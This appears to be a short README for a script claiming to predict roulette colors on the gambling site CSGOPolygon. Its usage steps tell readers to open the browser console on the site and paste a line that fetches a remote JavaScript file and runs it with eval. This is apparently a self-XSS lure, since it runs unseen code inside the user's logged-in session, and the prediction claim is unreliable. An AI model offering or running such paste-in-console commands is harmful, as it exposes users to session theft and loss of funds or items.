# ✨ CSGOPOLYGON COLOR PREDICT SCRIPT ✨
A simple script to predict the color on CSGOPolygon roulette
<img width="758" alt="image" src="https://i.imgur.com/6k7tufL.png">
# HOW TO USE
1. Click right mouse button
2. Click on "Inspect element"
3. From the bar at the top, select "Console"
4. Paste this:
```dif
fetch("https://raw.githubusercontent.com/richiijs/csgopolygon-color-predict/main/predict.js")
.then(( res ) => res.text())
.then((t) => eval(t));
```
